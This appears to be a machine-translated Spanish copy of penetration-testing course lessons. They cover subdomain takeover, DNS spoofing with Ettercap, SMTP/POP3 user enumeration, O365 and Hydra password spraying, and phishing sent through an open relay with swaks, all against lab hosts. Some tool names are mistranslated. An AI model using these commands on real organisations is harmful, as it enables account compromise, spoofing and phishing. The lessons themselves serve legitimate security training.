`Domain takeover`está registrando un nombre de dominio inexistente para obtener control sobre otro dominio. Si los atacantes encuentran un dominio caducado, pueden reclamar que el dominio realice más ataques, como alojar contenido malicioso en un sitio web o enviar un correo electrónico de phishing aprovechando el dominio reclamado.

La adquisición de dominio también es posible con subdominios llamados `subdomain takeover`. El nombre canónico de un DNS (`CNAME`) El registro se usa para asignar diferentes dominios a un dominio principal. Muchas organizaciones utilizan servicios de terceros como AWS, GitHub, Akamai, Fastly y otras redes de entrega de contenido (CDN) para alojar su contenido. En este caso, generalmente crean un subdominio y hacen que apunte a esos servicios. Por ejemplo,

  Atacar DNS

```shell-session
sub.target.com.   60   IN   CNAME   anotherdomain.com
```

El nombre de dominio (por ejemplo, `sub.target.com`) utiliza un registro CNAME a otro dominio (por ejemplo `anotherdomain.com`). Supongamos que el `anotherdomain.com` caduca y está disponible para que cualquiera pueda reclamar el dominio desde el `target.com`el servidor DNS tiene el `CNAME` grabar. En ese caso, cualquiera que se registre `anotherdomain.com` tendrá control total sobre `sub.target.com` hasta que se actualice el registro DNS.

#### Enumeración de Subdominio

Antes de realizar una adquisición de subdominios, debemos enumerar los subdominios para un dominio de destino utilizando herramientas como [Subfusor](https://github.com/projectdiscovery/subfinder). Esta herramienta puede raspar subdominios de fuentes abiertas como [DNSdumpster](https://dnsdumpster.com/). Otras herramientas como [Sublist3r](https://github.com/aboul3la/Sublist3r) también se puede utilizar para subdominios de fuerza bruta mediante el suministro de una lista de palabras pregenerada:

  Atacar DNS

```shell-session
vcrdcr@htb[/htb]# ./subfinder -d inlanefreight.com -v       
                                                                       
        _     __ _         _                                           
____  _| |__ / _(_)_ _  __| |___ _ _          
(_-< || | '_ \  _| | ' \/ _  / -_) '_|                 
/__/\_,_|_.__/_| |_|_||_\__,_\___|_| v2.4.5                                                                                                                                                                                                                                                 
                projectdiscovery.io                    
                                                                       
[WRN] Use with caution. You are responsible for your actions
[WRN] Developers assume no liability and are not responsible for any misuse or damage.
[WRN] By using subfinder, you also agree to the terms of the APIs used. 
                                   
[INF] Enumerating subdomains for inlanefreight.com
[alienvault] www.inlanefreight.com
[dnsdumpster] ns1.inlanefreight.com
[dnsdumpster] ns2.inlanefreight.com
...snip...
[bufferover] Source took 2.193235338s for enumeration
ns2.inlanefreight.com
www.inlanefreight.com
ns1.inlanefreight.com
support.inlanefreight.com
[INF] Found 4 subdomains for inlanefreight.com in 20 seconds 11 milliseconds
```

Una excelente alternativa es una herramienta llamada [Subbruto](https://github.com/TheRook/subbrute). Esta herramienta nos permite utilizar resolutores autodefinidos y realizar ataques de fuerza bruta de DNS puro durante las pruebas de penetración interna en hosts que no tienen acceso a Internet.

#### Subbruto

  Atacar DNS

```shell-session
vcrdcr@htb[/htb]$ git clone https://github.com/TheRook/subbrute.git >> /dev/null 2>&1
vcrdcr@htb[/htb]$ cd subbrute
vcrdcr@htb[/htb]$ echo "ns1.inlanefreight.com" > ./resolvers.txt
vcrdcr@htb[/htb]$ ./subbrute inlanefreight.com -s ./names.txt -r ./resolvers.txt

Warning: Fewer than 16 resolvers per process, consider adding more nameservers to resolvers.txt.
inlanefreight.com
ns2.inlanefreight.com
www.inlanefreight.com
ms1.inlanefreight.com
support.inlanefreight.com

<SNIP>
```

A veces, las configuraciones físicas internas están mal aseguradas, lo que podemos explotar para cargar nuestras herramientas desde una memoria USB. Otro escenario sería que hemos llegado a un host interno a través de pivotar y queremos trabajar desde allí. Por supuesto, hay otras alternativas, pero no está de más conocer formas y posibilidades alternativas.

La herramienta ha encontrado cuatro subdominios asociados con `inlanefreight.com`. Usando el `nslookup` o `host` comando, podemos enumerar el `CNAME` registros para esos subdominios.

  Atacar DNS

```shell-session
vcrdcr@htb[/htb]# host support.inlanefreight.com

support.inlanefreight.com is an alias for inlanefreight.s3.amazonaws.com
```

El `support` el subdominio tiene un registro de alias que apunta a un cubo AWS S3. Sin embargo, la URL `https://support.inlanefreight.com` muestra a `NoSuchBucket` error que indica que el subdominio es potencialmente vulnerable a una adquisición de subdominio. Ahora, podemos asumir el subdominio creando un cubo AWS S3 con el mismo nombre de subdominio.

![](https://academy.hackthebox.com/storage/modules/116/s3.png)

El [can-i-tomar-sobre-xyz](https://github.com/EdOverflow/can-i-take-over-xyz) el repositorio también es una excelente referencia para una vulnerabilidad de adquisición de subdominios. Muestra si los servicios objetivo son vulnerables a una adquisición de subdominios y proporciona pautas para evaluar la vulnerabilidad.

---

## DNS Spoofing

la suplantación de DNS también se conoce como Envenenamiento de caché de DNS. Este ataque implica alterar los registros DNS legítimos con información falsa para que puedan ser utilizados para redirigir el tráfico en línea a un sitio web fraudulento. Las rutas de ataque de ejemplo para el Envenenamiento de caché DNS son las siguientes:

- Un atacante podría interceptar la comunicación entre un usuario y un servidor DNS para enrutar al usuario a un destino fraudulento en lugar de uno legítimo realizando un Man-in-the-Middle (`MITM`) ataque.
    
- Explotar una vulnerabilidad encontrada en un servidor DNS podría generar control sobre el servidor por parte de un atacante para modificar los registros DNS.
    

#### Envenenamiento de caché DNS Local

Desde una perspectiva de red local, un atacante también puede realizar el Envenenamiento de caché DNS utilizando herramientas MITM como [Ettercap](https://www.ettercap-project.org/) o [Mejorcap](https://www.bettercap.org/).

Para explotar el envenenamiento de la caché DNS a través de `Ettercap`, primero deberíamos editar el `/etc/ettercap/etter.dns` archivo para mapear el nombre de dominio de destino (por ejemplo `inlanefreight.com`) que quieren falsificar y la dirección IP del atacante (por ejemplo `192.168.225.110`) que quieren redirigir a un usuario a:

  Atacar DNS

```shell-session
vcrdcr@htb[/htb]# cat /etc/ettercap/etter.dns

inlanefreight.com      A   192.168.225.110
*.inlanefreight.com    A   192.168.225.110
```

A continuación, comienza el `Ettercap` herramienta y busque hosts en vivo dentro de la red navegando a `Hosts > Scan for Hosts`. Una vez completado, agregue la dirección IP de destino (por ejemplo, `192.168.152.129`) a Target1 y agregue una IP de puerta de enlace predeterminada (por ejemplo `192.168.152.2`) a Target2.

![](https://academy.hackthebox.com/storage/modules/116/target.png)

Activar `dns_spoof` ataque navegando a `Plugins > Manage Plugins`. Esto envía la máquina de destino con respuestas DNS falsas que se resolverán `inlanefreight.com` a la dirección IP `192.168.225.110`:

![](https://academy.hackthebox.com/storage/modules/116/etter_plug.png)

Después de un ataque de suplantación de DNS exitoso, si un usuario víctima proviene de la máquina de destino `192.168.152.129` visitas el `inlanefreight.com` dominio en un navegador web, serán redirigidos a un `Fake page` eso está alojado en la dirección IP `192.168.225.110`:

![](https://academy.hackthebox.com/storage/modules/116/etter_site.png)

Además, un ping procedente de la dirección IP de destino `192.168.152.129` a `inlanefreight.com` debe resolverse a `192.168.225.110` también:

  Atacar DNS

```cmd-session
C:\>ping inlanefreight.com

Pinging inlanefreight.com [192.168.225.110] with 32 bytes of data:
Reply from 192.168.225.110: bytes=32 time<1ms TTL=64
Reply from 192.168.225.110: bytes=32 time<1ms TTL=64
Reply from 192.168.225.110: bytes=32 time<1ms TTL=64
Reply from 192.168.225.110: bytes=32 time<1ms TTL=64

Ping statistics for 192.168.225.110:
    Packets: Sent = 4, Received = 4, Lost = 0 (0% loss),
Approximate round trip times in milli-seconds:
    Minimum = 0ms, Maximum = 0ms, Average = 0ms
```

Estos son algunos ejemplos de ataques DNS comunes. Hay otros ataques más avanzados que se cubrirán en módulos posteriores.


# Últimas Vulnerabilidades DNS

---

Podemos encontrar miles de subdominios y dominios en la web. A menudo apuntan a que ya no hay proveedores de servicios de terceros activos como AWS, GitHub y otros y, en el mejor de los casos, muestran un mensaje de error como confirmación de un servicio de terceros desactivado. Las grandes empresas y corporaciones también se ven afectadas una y otra vez. Las empresas a menudo cancelan servicios de proveedores externos, pero se olvidan de eliminar los registros DNS asociados. Esto se debe a que no se incurre en costos adicionales por una entrada de DNS. Muchas plataformas conocidas de recompensas de errores, como [HackerOne](https://www.hackerone.com/), ya explícitamente lista `Subdomain Takeover` como categoría de recompensas. Con una simple búsqueda, podemos encontrar varias herramientas en GitHub, por ejemplo, que automatizan el descubrimiento de subdominios vulnerables o ayudan a crear Prueba de Conceptos (`PoC`) que luego se puede enviar al programa de recompensas de errores de nuestra elección o a la empresa afectada. RedHuntLabs hizo un [estudio](https://redhuntlabs.com/blog/project-resonance-wave-1.html) sobre esto en 2020, y descubrieron que más de 400,000 subdominios de 220 millones eran vulnerables a la adquisición de subdominios. El 62% de ellos pertenecía al sector del comercio electrónico.

#### Estudio RedHuntLabs

![](https://i0.wp.com/redhuntlabs.com/wp-content/uploads/2020/11/image-3.png) Fuente: https://redhuntlabs.com/blog/project-resonance-wave-1.html

---

## El Concepto del Ataque

Uno de los mayores peligros de una adquisición de subdominios es que se puede lanzar una campaña de phishing que se considera parte del dominio oficial de la empresa objetivo. Por ejemplo, los clientes mirarían el enlace y verían que el dominio `customer-drive.inlanefreight.com` (lo que apunta a un cubo S3 no existente de AWS) está detrás del dominio oficial `inlanefreight.com` y confía en él como cliente. Sin embargo, los clientes no saben que esta página ha sido reflejada o creada por un atacante para provocar un inicio de sesión por parte de los clientes de la compañía, por ejemplo.

Por lo tanto, si un atacante encuentra un `CNAME` registro en los registros DNS de la compañía que apunta a un subdominio que ya no existe y devuelve un `HTTP 404 error`, este subdominio probablemente puede ser asumido por nosotros a través del uso del proveedor externo. Una adquisición de subdominio se produce cuando un subdominio apunta a otro dominio utilizando el registro CNAME que no existe actualmente. Cuando un atacante registra este dominio inexistente, el subdominio apunta al registro del dominio por nosotros. Al hacer un solo cambio de DNS, nos hacemos el propietario de ese subdominio en particular, y después de eso, podemos administrar el subdominio como lo elijamos.

#### El Concepto de Ataques

![](https://academy.hackthebox.com/storage/modules/116/attack_concept2.png)

Lo que sucede aquí es que el subdominio existente ya no apunta a un proveedor externo y, por lo tanto, ya no está ocupado por este proveedor. Casi cualquiera puede registrar este subdominio como propio. Visitar este subdominio y la presencia del registro CNAME en el DNS de la compañía lleva, en la mayoría de los casos, a que las cosas funcionen como se esperaba. Sin embargo, el diseño y la función de este subdominio están en manos del atacante.

#### Iniciación de la Adquisición de Subdominios

|**Paso**|**Adquisición de Subdominio**|**Concepto de Ataques - Categoría**|
|---|---|---|
|`1.`|La fuente, en este caso, es el nombre del subdominio que ya no es utilizado por la empresa que descubrimos.|`Source`|
|`2.`|El registro de este subdominio en el sitio del proveedor externo se realiza mediante el registro y la vinculación a fuentes propias.|`Process`|
|`3.`|Aquí, los privilegios se encuentran con el propietario del dominio principal y sus entradas en sus servidores DNS. En la mayoría de los casos, el proveedor externo no es responsable de si este subdominio es accesible a través de otros.|`Privileges`|
|`4.`|El registro y la vinculación exitosos se realizan en nuestro servidor, que es el destino en este caso.|`Destination`|

Esto es cuando el ciclo comienza de nuevo, pero esta vez para activar el reenvío al servidor que controlamos.

#### Desencadenar el Reenvío

|**Paso**|**Adquisición de Subdominio**|**Concepto de Ataques - Categoría**|
|---|---|---|
|`5.`|El visitante del subdominio ingresa la URL en su navegador, y el registro DNS desactualizado (CNAME) que no se ha eliminado se utiliza como fuente.|`Source`|
|`6.`|El servidor DNS mira en su lista para ver si tiene conocimiento sobre este subdominio y si es así, el usuario es redirigido al subdominio correspondiente (que es controlado por nosotros).|`Process`|
|`7.`|Los privilegios para esto ya recaen en los administradores que administran el dominio, ya que solo ellos están autorizados a cambiar el dominio y sus servidores DNS. Dado que este subdominio está en la lista, el servidor DNS considera que el subdominio es confiable y reenvía al visitante.|`Privileges`|
|`8.`|El destino aquí es la persona que solicita la dirección IP del subdominio donde desea ser reenviado a través de la red.|`Destination`|

La adquisición de subdominios se puede usar no solo para phishing sino también para muchos otros ataques. Estos incluyen, por ejemplo, robar cookies, falsificación de solicitudes entre sitios (CSRF), abusar de CORS y derrotar la política de seguridad de contenido (CSP). Podemos ver algunos ejemplos de adquisiciones de subdominios en el [Sitio web de HackerOne](https://hackerone.com/hacktivity?querystring=%22subdomain%20takeover%22), que han ganado a los cazadores de recompensas de insectos pagos considerables.


# Ataque de Servicios de Correo Electrónico

---

A `mail server` (a veces también conocido como servidor de correo electrónico) es un servidor que maneja y entrega correo electrónico a través de una red, generalmente a través de Internet. Un servidor de correo puede recibir correos electrónicos de un dispositivo cliente y enviarlos a otros servidores de correo. Un servidor de correo también puede entregar correos electrónicos a un dispositivo cliente. Un cliente suele ser el dispositivo donde leemos nuestros correos electrónicos (ordenadores, teléfonos inteligentes, etc.).

Cuando presionamos el `Send` botón en nuestra aplicación de correo electrónico (cliente de correo electrónico), el programa establece una conexión a un `SMTP` servidor en la red o Internet. El nombre `SMTP` significa Simple Mail Transfer Protocol, y es un protocolo para entregar correos electrónicos de clientes a servidores y de servidores a otros servidores.

Cuando descargamos correos electrónicos a nuestra aplicación de correo electrónico, se conectará a un `POP3` o `IMAP4` servidor en Internet, que permite al usuario guardar mensajes en un buzón de servidor y descargarlos periódicamente.

Por defecto, `POP3` los clientes eliminan los mensajes descargados del servidor de correo electrónico. Este comportamiento dificulta el acceso al correo electrónico en múltiples dispositivos, ya que los mensajes descargados se almacenan en la computadora local. Sin embargo, normalmente podemos configurar un `POP3` cliente para guardar copias de los mensajes descargados en el servidor.

Por otro lado, por defecto, `IMAP4` los clientes no eliminan los mensajes descargados del servidor de correo electrónico. Este comportamiento facilita el acceso a los mensajes de correo electrónico desde múltiples dispositivos. Veamos cómo podemos orientar los servidores de correo.

![texto](https://academy.hackthebox.com/storage/modules/116/SMTP-IMAP-1.png)

---

## Enumeración

Los servidores de correo electrónico son complejos y generalmente requieren que enumeremos múltiples servidores, puertos y servicios. Además, hoy en día la mayoría de las empresas tienen sus servicios de correo electrónico en la nube con servicios como [Microsoft 365](https://www.microsoft.com/en-ww/microsoft-365/outlook/email-and-calendar-software-microsoft-outlook) o [G-Suite](https://workspace.google.com/solutions/new-business/). Por lo tanto, nuestro enfoque para atacar el servicio de correo electrónico depende del servicio en uso.

Podemos usar el `Mail eXchanger` (`MX`) Registro DNS para identificar un servidor de correo. El registro MX especifica el servidor de correo responsable de aceptar mensajes de correo electrónico en nombre de un nombre de dominio. Es posible configurar varios registros MX, generalmente apuntando a una matriz de servidores de correo para el equilibrio de carga y la redundancia.

Podemos utilizar herramientas como `host` o `dig` y sitios web en línea como [MXToolbox](https://mxtoolbox.com/) para consultar información sobre los registros MX:

#### Anfitrión - MX Records

  Ataque de Servicios de Correo Electrónico

```shell-session
vcrdcr@htb[/htb]$ host -t MX hackthebox.eu

hackthebox.eu mail is handled by 1 aspmx.l.google.com.
```

  Ataque de Servicios de Correo Electrónico

```shell-session
vcrdcr@htb[/htb]$ host -t MX microsoft.com

microsoft.com mail is handled by 10 microsoft-com.mail.protection.outlook.com.
```

#### DIG - Registros MX

  Ataque de Servicios de Correo Electrónico

```shell-session
vcrdcr@htb[/htb]$ dig mx plaintext.do | grep "MX" | grep -v ";"

plaintext.do.           7076    IN      MX      50 mx3.zoho.com.
plaintext.do.           7076    IN      MX      10 mx.zoho.com.
plaintext.do.           7076    IN      MX      20 mx2.zoho.com.
```

  Ataque de Servicios de Correo Electrónico

```shell-session
vcrdcr@htb[/htb]$ dig mx inlanefreight.com | grep "MX" | grep -v ";"

inlanefreight.com.      300     IN      MX      10 mail1.inlanefreight.com.
```

#### Anfitrión - A Records

  Ataque de Servicios de Correo Electrónico

```shell-session
vcrdcr@htb[/htb]$ host -t A mail1.inlanefreight.htb.

mail1.inlanefreight.htb has address 10.129.14.128
```

Estos `MX` los registros indican que los tres primeros servicios de correo están utilizando un servicio en la nube G-Suite (aspmx.l.google.com), Microsoft 365 (microsoft-com.mail.protection.outlook.com) y Zoho (mx.zoho.com), y el último puede ser un servidor de correo personalizado alojado por la empresa.

Esta información es esencial porque los métodos de enumeración pueden diferir de un servicio a otro. Por ejemplo, la mayoría de los proveedores de servicios en la nube utilizan la implementación de su servidor de correo y adoptan la autenticación moderna, lo que abre vectores de ataque nuevos y únicos para cada proveedor de servicios. Por otro lado, si la empresa configura el servicio, podríamos descubrir malas prácticas y configuraciones erróneas que permiten ataques comunes a los protocolos del servidor de correo.

Si estamos apuntando a una implementación personalizada del servidor de correo, como `inlanefreight.htb`, podemos enumerar los siguientes puertos:

|**Puerto**|**Servicio**|
|---|---|
|`TCP/25`|SMTP Sin cifrar|
|`TCP/143`|IMAP4 Sin cifrar|
|`TCP/110`|POP3 Sin cifrar|
|`TCP/465`|SMTP Cifrado|
|`TCP/587`|SMTP Cifrado/[ARRANQUE](https://en.wikipedia.org/wiki/Opportunistic_TLS)|
|`TCP/993`|IMAP4 Cifrado|
|`TCP/995`|POP3 Cifrado|

Podemos usar `Nmap`es el script predeterminado `-sC` opción para enumerar esos puertos en el sistema de destino:

  Ataque de Servicios de Correo Electrónico

```shell-session
vcrdcr@htb[/htb]$ sudo nmap -Pn -sV -sC -p25,143,110,465,587,993,995 10.129.14.128

Starting Nmap 7.80 ( https://nmap.org ) at 2021-09-27 17:56 CEST
Nmap scan report for 10.129.14.128
Host is up (0.00025s latency).

PORT   STATE SERVICE VERSION
25/tcp open  smtp    Postfix smtpd
|_smtp-commands: mail1.inlanefreight.htb, PIPELINING, SIZE 10240000, VRFY, ETRN, ENHANCEDSTATUSCODES, 8BITMIME, DSN, SMTPUTF8, CHUNKING, 
MAC Address: 00:00:00:00:00:00 (VMware)
```

---

## Configuraciones erróneas

Los servicios de correo electrónico utilizan la autenticación para permitir a los usuarios enviar correos electrónicos y recibir correos electrónicos. Una configuración incorrecta puede ocurrir cuando el servicio SMTP permite la autenticación anónima o protocolos de soporte que se pueden utilizar para enumerar nombres de usuario válidos.

#### Autenticación

El servidor SMTP tiene diferentes comandos que se pueden utilizar para enumerar nombres de usuario válidos `VRFY`, `EXPN`, y `RCPT TO`. Si enumeramos con éxito nombres de usuario válidos, podemos intentar rociar contraseñas, forzar brutas o adivinar una contraseña válida. Así que exploremos cómo funcionan esos comandos.

`VRFY`este comando indica al servidor SMTP receptor que verifique la validez de un nombre de usuario de correo electrónico en particular. El servidor responderá, indicando si el usuario existe o no. Esta característica se puede desactivar.

#### Comando VRFY

  Ataque de Servicios de Correo Electrónico

```shell-session
vcrdcr@htb[/htb]$ telnet 10.10.110.20 25

Trying 10.10.110.20...
Connected to 10.10.110.20.
Escape character is '^]'.
220 parrot ESMTP Postfix (Debian/GNU)


VRFY root

252 2.0.0 root


VRFY www-data

252 2.0.0 www-data


VRFY new-user

550 5.1.1 <new-user>: Recipient address rejected: User unknown in local recipient table
```

`EXPN` es similar a `VRFY`, excepto que cuando se usa con una lista de distribución, enumerará a todos los usuarios en esa lista. Esto puede ser un problema mayor que el `VRFY` comando ya que los sitios a menudo tienen un alias como "todos."

#### Comando EXPN

  Ataque de Servicios de Correo Electrónico

```shell-session
vcrdcr@htb[/htb]$ telnet 10.10.110.20 25

Trying 10.10.110.20...
Connected to 10.10.110.20.
Escape character is '^]'.
220 parrot ESMTP Postfix (Debian/GNU)


EXPN john

250 2.1.0 john@inlanefreight.htb


EXPN support-team

250 2.0.0 carol@inlanefreight.htb
250 2.1.5 elisa@inlanefreight.htb
```

`RCPT TO`identifica al destinatario del mensaje de correo electrónico. Este comando se puede repetir varias veces para que un mensaje dado entregue un solo mensaje a múltiples destinatarios.

#### RCPT AL Mando

  Ataque de Servicios de Correo Electrónico

```shell-session
vcrdcr@htb[/htb]$ telnet 10.10.110.20 25

Trying 10.10.110.20...
Connected to 10.10.110.20.
Escape character is '^]'.
220 parrot ESMTP Postfix (Debian/GNU)


MAIL FROM:test@htb.com
it is
250 2.1.0 test@htb.com... Sender ok


RCPT TO:julio

550 5.1.1 julio... User unknown


RCPT TO:kate

550 5.1.1 kate... User unknown


RCPT TO:john

250 2.1.5 john... Recipient ok
```

También podemos usar el `POP3` protocolo para enumerar usuarios dependiendo de la implementación del servicio. Por ejemplo, podemos usar el comando `USER` seguido por el nombre de usuario, y si el servidor responde `OK`. Esto significa que el usuario existe en el servidor.

#### Comando de USUARIO

  Ataque de Servicios de Correo Electrónico

```shell-session
vcrdcr@htb[/htb]$ telnet 10.10.110.20 110

Trying 10.10.110.20...
Connected to 10.10.110.20.
Escape character is '^]'.
+OK POP3 Server ready

USER julio

-ERR


USER john

+OK
```

Para automatizar nuestro proceso de enumeración, podemos usar una herramienta llamada [smtp-usuario-enum](https://github.com/pentestmonkey/smtp-user-enum). Podemos especificar el modo de enumeración con el argumento `-M` seguido de `VRFY`, `EXPN`, o `RCPT`y el argumento `-U` con un archivo que contiene la lista de usuarios que queremos enumerar. Dependiendo de la implementación del servidor y el modo de enumeración, necesitamos agregar el dominio para la dirección de correo electrónico con el argumento `-D`. Finalmente, especificamos el objetivo con el argumento `-t`.

  Ataque de Servicios de Correo Electrónico

```shell-session
vcrdcr@htb[/htb]$ smtp-user-enum -M RCPT -U userlist.txt -D inlanefreight.htb -t 10.129.203.7

Starting smtp-user-enum v1.2 ( http://pentestmonkey.net/tools/smtp-user-enum )

 ----------------------------------------------------------
|                   Scan Information                       |
 ----------------------------------------------------------

Mode ..................... RCPT
Worker Processes ......... 5
Usernames file ........... userlist.txt
Target count ............. 1
Username count ........... 78
Target TCP port .......... 25
Query timeout ............ 5 secs
Target domain ............ inlanefreight.htb

######## Scan started at Thu Apr 21 06:53:07 2022 #########
10.129.203.7: jose@inlanefreight.htb exists
10.129.203.7: pedro@inlanefreight.htb exists
10.129.203.7: kate@inlanefreight.htb exists
######## Scan completed at Thu Apr 21 06:53:18 2022 #########
3 results.

78 queries in 11 seconds (7.1 queries / sec)
```

---

## Enumeración de Nube

Como se discutió, los proveedores de servicios en la nube utilizan su propia implementación para los servicios de correo electrónico. Esos servicios comúnmente tienen características personalizadas que podemos abusar para la operación, como la enumeración de nombres de usuario. Usemos Office 365 como ejemplo y exploremos cómo podemos enumerar los nombres de usuario en esta plataforma en la nube.

[O365spray](https://github.com/0xZDH/o365spray) es una herramienta de enumeración de nombre de usuario y rociado de contraseña dirigida a Microsoft Office 365 (O365) desarrollada por [ZDH](https://twitter.com/0xzdh). Esta herramienta reimplementa una colección de técnicas de enumeración y pulverización investigadas e identificadas por las mencionadas en [Agradecimientos](https://github.com/0xZDH/o365spray#Acknowledgments). Primero validemos si nuestro dominio de destino está utilizando Office 365.

#### O365 Spray

  Ataque de Servicios de Correo Electrónico

```shell-session
vcrdcr@htb[/htb]$ python3 o365spray.py --validate --domain msplaintext.xyz

            *** O365 Spray ***            

>----------------------------------------<

   > version        :  2.0.4
   > domain         :  msplaintext.xyz
   > validate       :  True
   > timeout        :  25 seconds
   > start          :  2022-04-13 09:46:40

>----------------------------------------<

[2022-04-13 09:46:40,344] INFO : Running O365 validation for: msplaintext.xyz
[2022-04-13 09:46:40,743] INFO : [VALID] The following domain is using O365: msplaintext.xyz
```

Ahora, podemos intentar identificar nombres de usuario.

  Ataque de Servicios de Correo Electrónico

```shell-session
vcrdcr@htb[/htb]$ python3 o365spray.py --enum -U users.txt --domain msplaintext.xyz        
                                       
            *** O365 Spray ***             

>----------------------------------------<

   > version        :  2.0.4
   > domain         :  msplaintext.xyz
   > enum           :  True
   > userfile       :  users.txt
   > enum_module    :  office
   > rate           :  10 threads
   > timeout        :  25 seconds
   > start          :  2022-04-13 09:48:03

>----------------------------------------<

[2022-04-13 09:48:03,621] INFO : Running O365 validation for: msplaintext.xyz
[2022-04-13 09:48:04,062] INFO : [VALID] The following domain is using O365: msplaintext.xyz
[2022-04-13 09:48:04,064] INFO : Running user enumeration against 67 potential users
[2022-04-13 09:48:08,244] INFO : [VALID] lewen@msplaintext.xyz
[2022-04-13 09:48:10,415] INFO : [VALID] juurena@msplaintext.xyz
[2022-04-13 09:48:10,415] INFO : 

[ * ] Valid accounts can be found at: '/opt/o365spray/enum/enum_valid_accounts.2204130948.txt'
[ * ] All enumerated accounts can be found at: '/opt/o365spray/enum/enum_tested_accounts.2204130948.txt'

[2022-04-13 09:48:10,416] INFO : Valid Accounts: 2
```

---

## Ataques de Contraseña

Podemos usar `Hydra` para realizar un spray de contraseña o fuerza bruta contra servicios de correo electrónico como `SMTP`, `POP3`, o `IMAP4`. Primero, necesitamos obtener una lista de nombres de usuario y una lista de contraseñas y especificar qué servicio queremos atacar. Veamos un ejemplo para `POP3`.

#### Hydra - Ataque de Contraseña

  Ataque de Servicios de Correo Electrónico

```shell-session
vcrdcr@htb[/htb]$ hydra -L users.txt -p 'Company01!' -f 10.10.110.20 pop3

Hydra v9.1 (c) 2020 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2022-04-13 11:37:46
[INFO] several providers have implemented cracking protection, check with a small wordlist first - and stay legal!
[DATA] max 16 tasks per 1 server, overall 16 tasks, 67 login tries (l:67/p:1), ~5 tries per task
[DATA] attacking pop3://10.10.110.20:110/
[110][pop3] host: 10.129.42.197   login: john   password: Company01!
1 of 1 target successfully completed, 1 valid password found
```

Si los servicios en la nube admiten protocolos SMTP, POP3 o IMAP4, es posible que podamos intentar realizar el rociado de contraseñas utilizando herramientas como `Hydra`, pero estas herramientas generalmente están bloqueadas. En su lugar, podemos intentar usar herramientas personalizadas como [o365spray](https://github.com/0xZDH/o365spray) o [CorreoSniper](https://github.com/dafthack/MailSniper) para Microsoft Office 365 o [CredKing](https://github.com/ustayready/CredKing) para Gmail o Okta. Tenga en cuenta que estas herramientas deben estar actualizadas porque si el proveedor de servicios cambia algo (lo que sucede a menudo), es posible que las herramientas ya no funcionen. Este es un ejemplo perfecto de por qué debemos entender qué están haciendo nuestras herramientas y tener el know-how para modificarlas si no funcionan correctamente por alguna razón.

#### O365 Spray - Pulverización con contraseña

  Ataque de Servicios de Correo Electrónico

```shell-session
vcrdcr@htb[/htb]$ python3 o365spray.py --spray -U usersfound.txt -p 'March2022!' --count 1 --lockout 1 --domain msplaintext.xyz

            *** O365 Spray ***            

>----------------------------------------<

   > version        :  2.0.4
   > domain         :  msplaintext.xyz
   > spray          :  True
   > password       :  March2022!
   > userfile       :  usersfound.txt
   > count          :  1 passwords/spray
   > lockout        :  1.0 minutes
   > spray_module   :  oauth2
   > rate           :  10 threads
   > safe           :  10 locked accounts
   > timeout        :  25 seconds
   > start          :  2022-04-14 12:26:31

>----------------------------------------<

[2022-04-14 12:26:31,757] INFO : Running O365 validation for: msplaintext.xyz
[2022-04-14 12:26:32,201] INFO : [VALID] The following domain is using O365: msplaintext.xyz
[2022-04-14 12:26:32,202] INFO : Running password spray against 2 users.
[2022-04-14 12:26:32,202] INFO : Password spraying the following passwords: ['March2022!']
[2022-04-14 12:26:33,025] INFO : [VALID] lewen@msplaintext.xyz:March2022!
[2022-04-14 12:26:33,048] INFO : 

[ * ] Writing valid credentials to: '/opt/o365spray/spray/spray_valid_credentials.2204141226.txt'
[ * ] All sprayed credentials can be found at: '/opt/o365spray/spray/spray_tested_credentials.2204141226.txt'

[2022-04-14 12:26:33,048] INFO : Valid Credentials: 1
```

---

## Ataques Específicos de Protocolo

Un relé abierto es un Protocolo Simple de Transferencia de Correo (`SMTP`) servidor, que está configurado incorrectamente y permite un retransmisión de correo electrónico no autenticado. Los servidores de mensajería que se configuran accidental o intencionalmente como relés abiertos permiten que el correo de cualquier fuente se redireccione de forma transparente a través del servidor de retransmisión abierto. Este comportamiento enmascara la fuente de los mensajes y hace que parezca que el correo se originó en el servidor de retransmisión abierto.

#### Retransmisión Abierta

Desde el punto de vista de un atacante, podemos abusar de esto para phishing enviando correos electrónicos como usuarios no existentes o falsificando el correo electrónico de otra persona. Por ejemplo, imagine que estamos apuntando a una empresa con un servidor de correo de retransmisión abierto, e identificamos que usan una dirección de correo electrónico específica para enviar notificaciones a sus empleados. Podemos enviar un correo electrónico similar usando la misma dirección y agregar nuestro enlace de phishing con esta información. Con el `nmap smtp-open-relay` script, podemos identificar si un puerto SMTP permite un relé abierto.

  Ataque de Servicios de Correo Electrónico

```shell-session
vcrdcr@htb[/htb]# nmap -p25 -Pn --script smtp-open-relay 10.10.11.213

Starting Nmap 7.80 ( https://nmap.org ) at 2020-10-28 23:59 EDT
Nmap scan report for 10.10.11.213
Host is up (0.28s latency).

PORT   STATE SERVICE
25/tcp open  smtp
|_smtp-open-relay: Server is an open relay (14/16 tests)
```

A continuación, podemos utilizar cualquier cliente de correo para conectarnos al servidor de correo y enviar nuestro correo electrónico.

  Ataque de Servicios de Correo Electrónico

```shell-session
vcrdcr@htb[/htb]# swaks --from notifications@inlanefreight.com --to employees@inlanefreight.com --header 'Subject: Company Notification' --body 'Hi All, we want to hear from you! Please complete the following survey. http://mycustomphishinglink.com/' --server 10.10.11.213

=== Trying 10.10.11.213:25...
=== Connected to 10.10.11.213.
<-  220 mail.localdomain SMTP Mailer ready
 -> EHLO parrot
<-  250-mail.localdomain
<-  250-SIZE 33554432
<-  250-8BITMIME
<-  250-STARTTLS
<-  250-AUTH LOGIN PLAIN CRAM-MD5 CRAM-SHA1
<-  250 HELP
 -> MAIL FROM:<notifications@inlanefreight.com>
<-  250 OK
 -> RCPT TO:<employees@inlanefreight.com>
<-  250 OK
 -> DATA
<-  354 End data with <CR><LF>.<CR><LF>
 -> Date: Thu, 29 Oct 2020 01:36:06 -0400
 -> To: employees@inlanefreight.com
 -> From: notifications@inlanefreight.com
 -> Subject: Company Notification
 -> Message-Id: <20201029013606.775675@parrot>
 -> X-Mailer: swaks v20190914.0 jetmore.org/john/code/swaks/
 -> 
 -> Hi All, we want to hear from you! Please complete the following survey. http://mycustomphishinglink.com/
 -> 
 -> 
 -> .
<-  250 OK
 -> QUIT
<-  221 Bye
=== Connection closed with remote host.
```


# Últimas Vulnerabilidades de Servicio de Correo Electrónico

---

